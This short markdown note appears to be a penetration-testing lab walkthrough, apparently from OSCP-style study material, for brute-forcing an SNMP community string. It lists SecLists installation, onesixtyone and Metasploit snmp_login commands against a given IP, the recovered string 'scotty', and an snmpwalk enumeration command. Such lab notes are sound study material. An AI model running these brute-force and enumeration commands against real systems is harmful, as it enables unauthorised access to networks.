
[...back](../0-landing-ncsaoscp.md)

# 1 brief

snmp service
149.28.159.195:162
mission: brute force

---

# 2 wordlist seclist

```
sudo apt install seclists -y  # Or use your package manager
```

---

# 3 snmp login bf tools

```
onesixtyone -c wordlist.txt 149.28.159.195:162

msfconsole -> snmp_login
```

key: scotty

---

# 4 snmpwalk

```
snmpwalk -v2c -c [scotty] 149.28.159.195:162
```

---

[...back](../0-landing-ncsaoscp.md)
